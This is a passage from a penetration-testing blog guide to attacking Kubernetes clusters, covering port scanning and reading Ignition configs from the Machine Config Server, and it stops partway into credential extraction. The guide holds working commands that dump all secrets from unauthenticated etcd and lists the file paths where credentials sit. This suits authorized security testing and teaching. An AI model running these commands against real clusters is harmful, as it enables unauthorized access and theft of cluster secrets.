---
title: Kubernetes Penetration Testing: Complete 2026 Guide
url: https://www.hackingdream.net/2026/01/kubernetes-penetration-testing-complete-guide.html
source: Hacking Dream
date: 2026-01-20
fetch_date: 2026-01-21T03:31:40.315533
---

# Kubernetes Penetration Testing: Complete 2026 Guide

* [Home](http://www.hackingdream.net)
* [About Author](http://www.hackingdream.net/p/about-author.html)
* [Contact US](http://www.hackingdream.net/p/contact-us.html)

[# ![Hacking Dream](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgI3MZul9awsB7xmLlAs9J9xDOsiYxbMQoa4EQkvg9T9oe4q5zkZRqV0W4UN2KhrQQWPLveTvQ9kkuHu2HfrahqY0Gc53G1cVCwQNY2G3MVkEOJoDvLIK9lFtBUc-HhRciiteWdHYV4SaE/s1600/Size-Modified.png)](https://www.hackingdream.net/)

Main menu

close

* [Home](http://www.hackingdream.net)
* [AI Sec](https://www.hackingdream.net/search/label/AI)
* [AI Pentest](http://www.hackingdream.net/search/label/AI%20Attacks)
* [Cheatsheets](https://www.hackingdream.net/search/label/Cheatsheet)
* [Pentest](https://www.hackingdream.net/search/label/Pentest)
* [\_Active Directory](https://www.hackingdream.net/search/label/Active%20Directory)
* [\_Linux](http://www.hackingdream.net/search/label/Kali%20Linux)
* [\_Wireless](http://www.hackingdream.net/search/label/Wifi%20Hacking)
* [\_Target Hacking](http://www.hackingdream.net/search/label/Target%20Hacking)
* [Purple Team](https://www.hackingdream.net/search/label/Purple%20Team)
* [Bin Exp](https://www.hackingdream.net/search/label/Exploitation)
* How To
* [\_Blogging](http://www.hackingdream.net/search/label/Blogging)
* [\_Solved Problems](http://www.hackingdream.net/search/label/Solved%20Problems)
* [\_Money Making](http://www.hackingdream.net/search/label/Money%20Making)
* [\_Top Ten](http://www.hackingdream.net/search/label/Top%20Ten)
* [\_Gaming](http://www.hackingdream.net/search/label/Games)

### Kubernetes Penetration Testing: Complete 2026 Guide

[January 21, 2026](https://www.hackingdream.net/2026/01/kubernetes-penetration-testing-complete-guide.html "permanent link")

Kubernetes Penetration Testing: Complete 2026 Guide

# Kubernetes Penetration Testing: Complete 2026 Guide

*Updated on January 21, 2026*

## Table of Contents

* [1. Introduction & Reconnaissance](#intro)
* [2. Initial Access & Credential Extraction](#initial-access)
* [3. Cluster Enumeration](#enumeration)
* [4. Privilege Escalation](#privilege-escalation)
* [5. Lateral Movement & Supply Chain Attacks](#lateral-movement)
* [6. Post-Exploitation & Persistence](#post-exploitation)
* [7. Detection Evasion](#detection)
* [8. Remediation & Defense](#remediation)

---

## Introduction: The Modern Kubernetes Attack Surface (2026)

Kubernetes security has evolved dramatically since 2022. While traditional pentesting relied on open ports and default configurations, modern attacks now target:

* **Supply chain compromise** through container registries
* **Ignition/cloud-init configurations** exposed during bootstrap
* **Embedded service account tokens** in recovery scripts
* **SSH certificate authority keys** for authentication bypass
* **Privileged pod escape** through mount namespace manipulation

This comprehensive guide covers both the foundational techniques and the 2026 attack patterns discovered through real-world penetration testing.

[![Kubernetes Penetration Testing: Complete Guide](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEizu4QZ_aXtdZUFzzcvM5Bx9X7iY3nFq8vyxvn_LUnBrCQUxJERIvUugyF0Q0NpxQ8kUuFe8J5w6olU2enpTzOco0pIAjSZJQUz8Y5TsWEf71u8V3WY42lrekPtl9XX3-93c7K1JXBFloEMyY-xUAyzyz-l1WG8B6UjMTz66uDQgMC_HL8R38DZ8o5sGBE/w640-h292/Kubernetes-Penetration-Testing-Complete-Guide.jpg "Kubernetes Penetration Testing: Complete Guide")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEizu4QZ_aXtdZUFzzcvM5Bx9X7iY3nFq8vyxvn_LUnBrCQUxJERIvUugyF0Q0NpxQ8kUuFe8J5w6olU2enpTzOco0pIAjSZJQUz8Y5TsWEf71u8V3WY42lrekPtl9XX3-93c7K1JXBFloEMyY-xUAyzyz-l1WG8B6UjMTz66uDQgMC_HL8R38DZ8o5sGBE/s1024/Kubernetes-Penetration-Testing-Complete-Guide.jpg)

---

## Part 1: Reconnaissance - Mapping the Kubernetes Attack Surface

### 1.1 Network Scanning & Service Discovery

Before attempting any active exploitation, establish what Kubernetes services are running and accessible.

**Target Ports & Services:**

| Port | Service | Priority | Notes |
| --- | --- | --- | --- |
| 6443 | API Server | CRITICAL | Main control plane interface |
| 2379-2380 | etcd | CRITICAL | Cluster state & secrets database |
| 10250 | Kubelet API | HIGH | Node operations & pod exec |
| 30000-32767 | NodePorts | HIGH | Direct application access (Bypasses Ingress) |
| 10255 | Kubelet Read-Only | MEDIUM | Legacy read-only API (No Auth) |
| 10259 | Kube-Scheduler | MEDIUM | Scheduling decisions |
| 10257 | Kube-Controller-Manager | MEDIUM | Resource management |
| 22623 | Machine Config Server (MCS) | HIGH | **NEW 2026**: Node configurations, ignition configs |
| 443 | HTTPS Ingress | MEDIUM | Application entry points |
| 2181 | Zookeeper (if present) | MEDIUM | Distributed coordination |

**Scanning Commands:**

```
# Network discovery
nmap -sV -p 2379,2380,6443,10250,10257,10259,22623,30000-32767 10.0.0.0/24

# Kubernetes-specific scanning
./kube-hunter --cidr 10.0.0.0/24 --active

# Version fingerprinting
curl -k https://10.10.10.10:6443/version
curl -k https://10.10.10.10:6443/healthz
curl -k https://10.10.10.10:6443/.well-known/openid-configuration
```

### 1.2 Machine Config Server (MCS) - NEW 2026 Attack Vector

The Machine Config Server (port 22623) serves Ignition configurations that bootstrap nodes. This is often **world-accessible** and contains critical secrets.

**Reconnaissance:**

```
# Enumerate MCS endpoint
curl -kL https://10.10.10.10:22623/config/master
curl -kL https://10.10.10.10:22623/config/worker

# Extract and parse Ignition config (JSON)
# The response contains base64-encoded Ignition data

# Look for common secret locations in response:
# - /var/lib/kubelet/config.json (registry credentials)
# - /etc/kubernetes/kubelet.conf (kubelet config)
# - /usr/local/bin/recover-kubeconfig.sh (JWT tokens)
# - /etc/ssh/ca.pub (SSH CA keys)
```

### 1.3 Kubernetes API Server Endpoint Discovery

During reconnaissance, discover internal vs. external API endpoints:

```
# From Ignition config or exposed env files:
# KUBERNETESSERVICEHOST=api-int.cluster-name.example.com
# KUBERNETESSERVICEPORT=6443

# This reveals internal API that may bypass external load balancers
# Useful for DDoS, rate-limit bypass, or direct targeting

nmap -p 6443 api-int.cluster-name.example.com
```

### 1.4 Etcd Direct Access (Critical)

If etcd is accessible without authentication, full cluster compromise is achieved.

```
# Download etcdctl if not available
wget https://github.com/etcd-io/etcd/releases/download/v3.5.0/etcd-v3.5.0-linux-amd64.tar.gz

# Connect to etcd
etcdctl --endpoints=http://10.10.10.10:2379 member list
etcdctl --endpoints=http://10.10.10.10:2379 get / --prefix --keys-only

# Extract all secrets (they're stored in etcd!)
etcdctl --endpoints=http://10.10.10.10:2379 get /registry/secrets/ --prefix

# Get cluster configuration
etcdctl --endpoints=http://10.10.10.10:2379 get /registry/clusterrolebindings/ --prefix
```

### 1.5 NodePort & Sidecar Enumeration

Attackers often overlook the NodePort range (30000-32767), which exposes internal services directly on the node's IP, bypassing Ingress protections. Additionally, legacy read-only ports and monitoring tools can leak cluster topology.

```
# NodePort Range Scanning (Detects apps exposed directly on nodes)
nmap -sV -p 30000-32767 10.10.10.10

# Kubelet Read-Only Port (10255) - Dumps full pod specs without auth
# (Rare in modern clusters but critical if present)
curl -s http://10.10.10.10:10255/pods | jq .items[].metadata.name

# Common Monitoring & Sidecar Ports
# 9090 (Prometheus), 3000 (Grafana), 10256 (Kube-proxy health)
nmap -p 9090,3000,10256 10.10.10.10
```

---

## Part 2: Initial Access & Credential Extraction

### 2.1 Extracting Credentials from Ignition Configurations

**[NEW 2026 TECHNIQUE]** Ignition files exposed via MCS contain multiple credential types.

#### 2.1.1 Container Registry Credentials

Many Kubernetes clusters use private registries (Artifactory, Quay, ECR). These credentials are stored in `/var/lib/ku...